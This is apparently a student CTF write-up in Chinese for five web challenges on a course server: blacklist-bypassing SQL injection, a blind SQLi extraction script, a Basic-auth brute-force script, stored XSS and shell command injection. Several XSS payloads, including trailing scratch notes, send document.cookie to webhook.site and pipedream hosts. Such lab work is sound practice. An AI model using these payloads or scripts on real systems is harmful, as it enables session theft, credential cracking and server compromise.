---
title: CTF-Project2
tags: [CTF]

---

# ADL-Project 2

## chiikawa_login_1
F12裡有提示source code的位置 
> ![image](https://hackmd.io/_uploads/BkHHk-cSyg.png)

http://ctf.adl.tw:12003/?source
> ![image](https://hackmd.io/_uploads/H1Wse-9Hye.png)
> 

### 觀察程式碼可知
**1. 原始查詢為：**
```sql
SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';
```

**2. 登入驗證部分：**
```php
$sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";
```
登入成功的條件是匹配用戶名必為 Usagi 且密碼正確，使用直接拼接的方式執行查詢。
存在 SQL 注入風險。

**3. 黑名單使用了 str_ireplace 將特定字詞替換為空字串**
```php
$blacklist = array("union", "select", "where", "and", "or");
$replace = array("", "", "", "", "");
$username = str_ireplace($blacklist, $replace, $username);
$password = str_ireplace($blacklist, $replace, $password);
```
可以使用拆分字詞例如 UNION 可以用 UUNIONNION。

### 思路：使用 `UUNIONNION SSELECTELECT` 繞過黑名單
先嘗試 `username = ' UUNIONNION SSELECTELECT 'Usagi','1234' -- ` 失敗
猜測原始查詢應該是返回 3 個欄位：`id`、`username` 和 `password`。

且題目密碼欄位不能為空，要特別注意驗證邏輯
```php
if ($fetch["username"] === 'Usagi' && $fetch["password"] === $password)
```
會檢查查詢結果中的 `$username` 和 `$password` 

所以`UNION SELECT` 中插入的 `password`必須和 POST 的 `password`一致
否則`$loginStatus` 不會被設置為 True。

**payload:** (最後面一定要空格)
username:`'UUNIONNION SSELECTELECT 'Usagi','Usagi','1234' --`
password:`1234`
or
username:`'UUNIONNION SSELECTELECT  NULL,'Usagi','Usagi' --`
password:`Usagi`
```sql
SELECT * FROM users WHERE `username` = '' UUNIONNION SSELECTELECT 'Usagi','Usagi','1234' -- 
SELECT * FROM users WHERE `username` = '' UUNIONNION SSELECTELECT NULL,'Usagi','Usagi' -- 
```
第一部分 username = '' 不會返回結果，但無關緊要。
第二部分模擬了一筆記錄，username、password 和其他欄位都設為 Usagi。

**flag:** `ADL{Frieren, Beyond Journey's End...https://youtu.be/OIBODIPC_8Y}`

## chiikawa_login_2
第一題僅是成功登入拿到flag但並非真正密碼
所以第二題應該是要拿到真正的密碼

#### sqlmap
一開始先嘗試sqlmap的方法
(但這題似乎被禁用)
![image](https://hackmd.io/_uploads/HkFk5RqB1g.png)

#### blind SQL injection

沿用上一題思路
使用blind SQL injection (半暴力)
每次和正確密碼的一位進行比對
逐步累加到正確的flag `ADL{~}`

```python=
import requests
import time

# 目標 URL
url = "http://ctf.adl.tw:12003/"
known_password = ""
password_charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*-_=+[]}{;:,.<>?//|`~"

# HTTP 請求頭
header = {
    "Content-Type": "application/x-www-form-urlencoded"
}

num = 1  # 初始位置

while True:
    found_next_char = False
    for char in password_charset:
        # 構造 SQL 注入，使用變量 num
        payload = f"' UUNIONNION SSELECTELECT 'Usagi','Usagi', SUBSTRING((SELECT password FROM users WHERE username = 'Usagi'), {num}, 1) -- "

        data = {
            "username": payload,
            "password": ""  # 密碼不需要用來進行比對，直接留空
        }

        # 發送 POST 請求
        response = requests.post(url, headers=header, data=payload)

        # 將響應內容轉換為文本
        response_length = len(response.text)
        print(f"Trying: {payload} | Response Length: {response_length} | Status Code: {response.status_code}")

        # 檢查響應內容是否包含 "submit"
        if "submit" not in response.text:
            known_password += char
            print(f"[+] Found character: {char} -> Current password: {known_password}")
            found_next_char = True
            break
        else:
            print(f"[ ] Character {char} did not match.")

    if not found_next_char:
            print(f"[!] No matching character found at position {num}. Exiting.")
            break  # 結束程式或執行其他錯誤處理邏輯

    # 檢查是否找到 '}' 字符
    if '}' in known_password:
        print(f"[!] Detected '}}', stopping. Current password: {known_password}")
        break

    num += 1  # 增加 num，以便下次提取下一個字符
    time.sleep(2)  # 加入延遲以避免過於頻繁的請求

```
**flag:**`ADLCTF{Ulay@HAy@HAuLAUlay@HAy@HAuLA...https://www.youtube.com/watch?v=9tD5kbzDxRA}`


## koduckkoduck
我們查了一下這題的html碼發現有兩行不明的字串
![螢幕擷取畫面 2024-12-26 231507](https://hackmd.io/_uploads/HyUEbZjSke.png)
分別對兩者進行base64解密後得到了以下資訊
![螢幕擷取畫面 2024-12-26 231514](https://hackmd.io/_uploads/rJPEWbsrkl.png)
![螢幕擷取畫面 2024-12-26 231543](https://hackmd.io/_uploads/rJDNZ-irke.png)
用burp suite抓網頁，然後用repeater，送request，看到在response中的set-cookie這邊也有不明字串
![螢幕擷取畫面 2024-12-26 230840](https://hackmd.io/_uploads/ByNMb-jS1g.png)
透過以上的資訊有兩種方法可以解決，使用curl找flag，或是看到flag底下又有一個_flag，Decode就得到
**flag:** `ADLCTF{C0Okie_i5_yummy!KoduckK0dUCK}`
![image](https://hackmd.io/_uploads/B14hLR5H1l.png)


![螢幕擷取畫面 2024-12-26 211342](https://hackmd.io/_uploads/H1iTL05H1x.png)


## Subscribe
這題大致上是照著網頁給的提示一步一步進行修改即可。
首先透過GET並搭配以下header連上網頁。
![螢幕擷取畫面 2024-12-12 201840](https://hackmd.io/_uploads/ry22EIuNJg.png)
得到必須使用SUBSCRIBE method的提示。
![upload_13d3872f62c82e2f87dba04aaea8d3b3](https://hackmd.io/_uploads/SJV7j1oHkx.png)

修改method後
![螢幕擷取畫面 2024-12-12 201945](https://hackmd.io/_uploads/HJtnFU_4Jg.png)
會得到以下的頁面，提示需使用SAKUNA_Browser
![upload_13d3872f62c82e2f87dba04aaea8d3b3](https://hackmd.io/_uploads/ByuDikirkx.png)

我們可以去修改User-Agent達到這個要求
![螢幕擷取畫面 2024-12-12 202051](https://hackmd.io/_uploads/H1gKnYIuEkx.png)
接續得到我們必須來自於`https://www.subscribesakuna.com`
![upload_d67be4a9ae43a22a5fba68fb70fda296](https://hackmd.io/_uploads/r1SniyjSkl.png)

原來是直接加上`FROM`的標頭但發現不正確，後來查詢資料發現要使用的是`Referer`標頭
![螢幕擷取畫面 2024-12-12 202219](https://hackmd.io/_uploads/HJlFhFUdNkg.png)
接續得到必須有特定的`Host`
![upload_d67be4a9ae43a22a5fba68fb70fda296](https://hackmd.io/_uploads/Bk0XhysS1l.png)

同樣在標頭加入對應的`Host`
![螢幕擷取畫面 2024-12-12 202257](https://hackmd.io/_uploads/SJlthtLuVke.png)
後來得到需要特定`cookie`的提示
![upload_d67be4a9ae43a22a5fba68fb70fda296](https://hackmd.io/_uploads/r1_qhyoSyx.png)

我們可以透過`Cookie: name=value`進行設定
![螢幕擷取畫面 2024-12-12 202354](https://hackmd.io/_uploads/rkY2tUd4ke.png)
終於到了準備登入的畫面，在這邊有提示我們可以透過`darkweb2017-top10000.txt`這個檔案進行暴力破解
![upload_d67be4a9ae43a22a5fba68fb70fda296](https://hackmd.io/_uploads/HJRRhJiByx.png)

讓我們先直接access`/admin`看看會得到甚麼結果
![螢幕擷取畫面 2024-12-12 202438](https://hackmd.io/_uploads/BJYnKIONkl.png)
可以發現這裡有兩個訊息，一個是需要使用`Basic`這個驗證方式
![螢幕擷取畫面 2024-12-12 202446](https://hackmd.io/_uploads/rJFnFUuNkl.png)
另一個是驗證當中需要有輸入`username`與`password`
![螢幕擷取畫面 2024-12-12 202459](https://hackmd.io/_uploads/HyeKhKIdVJe.png)
查詢了有關basic驗證的方法，提到我們需要在標頭加入`Authorization: Basic <credentials>`，並且其中的`<credentials>`是透過`<username>:<password>`再進行`base64`的編碼組成。
![1735220103730](https://hackmd.io/_uploads/Bk42oA9r1g.jpg)
原先我們預計使用`Burp Intruder`進行暴力破解，但發現免費版會有速度限制...
![螢幕擷取畫面 2024-12-12 202751](https://hackmd.io/_uploads/BybYnFUdEkx.png)
因此我們自行開發了python script暴力破解密碼
```python
import base64
import requests
from time import sleep
from requests.exceptions import Timeout

# 定義目標 URL 和文件路徑
url = "http://ctf.adl.tw:12002/admin"

# 定義固定的請求標頭
headers = {
    "Host": "sakuna.com",
    "Cache-Control": "max-age=0",
    "Accept-Language": "zh-TW,zh;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "SAKUNA_Browser",
    "Referer": "https://www.subscribesakuna.com",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "sakuna=kawaiiiiiiiiiiiiiiiiiiiiiiYAHA",
    "Connection": "keep-alive",
}

# 打開文件並逐行處理
with open("./darkweb2017-top10000.txt", "r", encoding="utf-8") as f:
    for line in f:
        password = line.strip()  # 去除每行首尾的空白字符或換行符
        
        # 將 "SAKUNA:" 與密碼組合，並進行 Base64 編碼
        auth_string = f"SAKUNA:{password}"
        auth_base64 = base64.b64encode(auth_string.encode()).decode()

        # 將編碼結果添加到 Authorization 標頭中
        headers["Authorization"] = f"Basic {auth_base64}"

        try:
            # 發送 HTTP 請求
            response = requests.get(url, headers=headers, timeout=10)  # 設定 10 秒的超時時間

            # 檢查響應狀態碼
            if response.status_code == 200:
                print(f"Success! Password found: {password}")
                break
            else:
                print(f"Tried password: {password} - Status code: {response.status_code}")
        
            # 印出 Content-Length（如果存在）
            content_length = response.headers.get("Content-Length", "No Content-Length header received")
            print(f"Content-Length: {content_length}")
            
        except Timeout:
            # 如果超時，則休眠 30 秒再重試
            print("Request timed out. Sleeping for 30 seconds...")
            sleep(30)

print("Password cracking completed.")
```
因為在破解當中發現伺服器每隔一段時間(一定量的request？)就會timeout使得破解無法繼續，所以使用了`try except`的方式如果抓到`Timeout`就休息一段時間在繼續。
![螢幕擷取畫面 2024-12-12 202827](https://hackmd.io/_uploads/H1YhYUOVkl.png)
![螢幕擷取畫面 2024-12-12 202853](https://hackmd.io/_uploads/S1KhFUdVJx.png)
最後我們使用了以下的header成功登入了`sakuna`
![螢幕擷取畫面 2024-12-12 203336](https://hackmd.io/_uploads/HkY3Y8OVkg.png)
```
SUBSCRIBE /admin HTTP/1.1
Host: sakuna.com
Cache-Control: max-age=0
Accept-Language: zh-TW,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: SAKUNA_Browser
Referer: https://www.subscribesakuna.com
Authorization: Basic U0FLVU5BOnJhaW5ib3c2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: sakuna=kawaiiiiiiiiiiiiiiiiiiiiiiYAHA
```
以下是存在其中的flag
![螢幕擷取畫面 2024-12-13 215922](https://hackmd.io/_uploads/Sy4RT3Y4yl.png)
**flag**:`ADLCTF{s4kuNA_kAWA11_5uBSCR1Be_https://youtube.com/channel/UCrV1Hf5r8P148idjoSfrGEQ?si=ksHGQgL0ar79DH5Q}`


## msg_board

首先試著輸入的內容發現會被儲存在留言板上，然後發現如果寫入tag會被database儲存起來
同時這個網站是公開的，代表留言的內容會被其他人所看到
瀏覽這個網頁的人都會看到寫入的語法(執行寫入的Javascript)
因此推斷為Stored XSS

那能夠執行Javascript的話，最嚴重的就是偷cookie了，所以推斷flag可能在cookie裡

所以可以嘗試寫一個script，用fetch發request到server

網路上有推薦https://webhook.site/ 
可以自動記錄對網址發http request時的所有參數


**Webhook.site：**
提供一個臨時的 URL，用於接收並記錄 HTTP 請求，包括請求參數、標頭和內容。
在此例中，https://webhook.site/28abc064-fe98-471b-adee-30683a249f8c 是接收 Cookie 資料的伺服器地址。

`<image src=x onerror="fetch('https://接收的server/?'+document.cookie)">`

**image元素**
實際上應為 `<img>`，但瀏覽器允許容錯解析為圖片元素。
`src="x"` 指定了無效的圖片來源地址 x，因此加載失敗。

**onerror 屬性**
定義：當元素加載失敗時（如圖片無法加載），觸發 onerror 事件。
用途：這裡的 onerror 屬性執行了一段 JavaScript，目的是利用失敗的加載觸發惡意行為。

**fetch() 函數**
用於向伺服器發送 HTTP 請求。
```javascript
fetch('<URL>' + document.cookie)
URL：https://webhook.site/28abc064-fe98-471b-adee-30683a249f8c/
```
URL：https://webhook.site/28abc064-fe98-471b-adee-30683a249f8c/
查詢參數：通過 document.cookie 獲取當前頁面的 Cookie，並附加到 URL 中。


**payload**
```html
範例：
<image src=x onerror="fetch('https://接收的server/?'+document.cookie)">
    
我的：
<image src=x onerror="fetch('https://webhook.site/28abc064-fe98-471b-adee-30683a249f8c/?'+document.cookie)">
```
> 使用 [https://webhook.site/](https://)
> ![image](https://hackmd.io/_uploads/ByXmZf5SJl.png)
> 
**flag:** `ADLCTF{s@kuNa_D@!5uk!_No_5MokiN9}`
## Pokedex
有了前面的經驗，一樣先找看看source code
http://ctf.adl.tw:12005/?source

> ![image](https://hackmd.io/_uploads/SJYTa0cB1x.png)

常見指令符號都在blacklist裡面，但還是有可以用的
像`$`，`cat` 可改成 `tac`，flag 可嘗試 `f1ag` 或 `f[l]ag`，一開始嘗試 `{"number":"001"}`
後面接的指令都被當作字串

本來以為會直接打出flag，結果意外發現能和圖片一起嵌入指令
> ![image](https://hackmd.io/_uploads/S1N4yJsSke.png)

將單引號正確插入`{"number":"001'$(ls )'"}`，結束字串後讓'$(ls ..)'不會被當成字串
`ls`命令，列出當前目錄中的檔案，顯示目錄中的文件
> ![image](https://hackmd.io/_uploads/SJoveJoSJl.png)
`"001index.php koduck.gif koduck_dance.gif koduck_scream.gif koduck_turnaround.gif pokedex_images"`

玩玩看，找flag放在哪
> ![image](https://hackmd.io/_uploads/BkHdbJiryl.png)

`{"number":"001'$(ls pokedex_images)'"}`
> ![image](https://hackmd.io/_uploads/S1nAGJiB1l.png)

`{"number":"001'$(ls /)'"}`
> ![image](https://hackmd.io/_uploads/B1GG4yjH1g.png)

找到flag目錄
`{"number":"001'$(tac /f[l]ag)'"}`
> ![image](https://hackmd.io/_uploads/S1kINysB1g.png)

**flag:** `ADL{CMD_1njECT!0n_By_koDuck}`


------

SAKUNA:rainbow6

ssh -i C:\Users\USER\myVM_key.pem azureuser@20.55.27.80


http://ctf.adl.tw:12004/


(可以)
```
<iframe onload="window.location.href='https://eorn7qrhmk3np62.m.pipedream.net/'+document.cookie">


<iframe style="display:none" src="javascript:fetch('https://eorn7qrhmk3np62.m.pipedream.net/?'+document.cookie)"
></iframe>
```

(不行)
```
<div style="visibility:hidden" onload="fetch('https://eorn7qrhmk3np62.m.pipedream.net/?'+document.cookie)"></div>

<a href="#" onmouseover="fetch('https://20.55.27.80:80/?'+document.cookie)">test</a>



<image style="display:none" src="javascript:fetch('https://eorn7qrhmk3np62.m.pipedream.net/?'+document.cookie)">

<image src=x onerror="fetch('https://eorn7qrhmk3np62.m.pipedream.ner/?'+document.cookie)">


<image style="display:none"
src="javascript:fetch('https://eorn7qrhmk3np62.m.pipedream.net/?'+document.cookie)">
```



